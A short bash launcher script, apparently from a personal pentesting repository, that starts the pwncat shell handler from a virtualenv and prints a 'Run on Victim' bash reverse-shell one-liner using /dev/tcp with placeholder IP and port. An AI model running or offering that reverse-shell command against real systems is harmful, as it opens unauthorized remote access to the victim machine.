#!/bin/bash

# turn list of arguments into string to pass them as they are
ARGS=$(echo "$@")
WD='/home/paul/repositories/hacking/pwncat/'

# activate virtualenv
CMD='source '"$WD"'bin/activate'
# append command
CMD="$CMD"' && python -m pwncat --config '"$WD"'pwncatrc '"$ARGS"

echo
echo "Run on Victim"
echo "command \"/bin/bash -c '/bin/bash -i >& /dev/tcp/\$IP/\$PORT 2>&1 0>&1'\""
echo
echo

# execute in own bash instance
# this prevents the virtualenv to stick
echo running \""$CMD"\" in $(pwd)
echo ---------------start---------------
/bin/bash -c "$CMD"
echo ----------------end----------------

